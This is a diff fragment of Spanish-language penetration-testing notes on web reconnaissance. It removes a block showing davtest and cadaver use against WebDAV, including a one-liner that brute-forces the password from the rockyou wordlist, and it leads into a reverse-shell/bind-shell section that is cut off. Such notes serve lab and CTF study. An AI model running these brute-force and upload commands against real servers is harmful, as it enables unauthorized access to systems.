@@ -70,22 +70,6 @@ Tags: #Web #Reconocimiento #Escaneo #CMS #Comandos #HTTP #HTTPS #WordPress #Joom
 ❯ wget "http://IP/index"               # Obtenemos el archivo index 'descargamos'
 ```
 
-```bash 
-❯ davtest -url http://127.0.0.1 -auth admin:admin     # Debemos de tener el usuario y passwd validos para poder usar la tool
-
-	# 1er admin = Usuario 
-	# 2do admin = passwd
-
-❯ cat /usr/share/wordlists/rockyou.txt | while read password; do response=$(davtest -url http://127.0.0.1 -auth admin:$password 2>&1 | grep -i succed); if [ $response ]; then echo "[+] La passwd correcta es: $password"; break; fi; done
-
-# Ataque de Fuerza Bruta para encontrar la passwd con el comando davtest
-
-❯ cadaver http://127.0.0.1     # Sirve para subir archivos, descargar contenido, etc... Debemos de tener el usaurio y passwd validos para la autenticacion 
-	❯ mkdri test              # Podriamos crearnos dir en los cuales podemos colocar un recurso 
-	❯ cd test 
-	❯ put webdav.txt          # Podemos subir un archivo 
-```
-
 ## ReverShell y BindShell
 Este comando lo ejecutamos desde la pagina web para hacer una **ReverShell** : 
 1) Cuando tenemos Netcat 
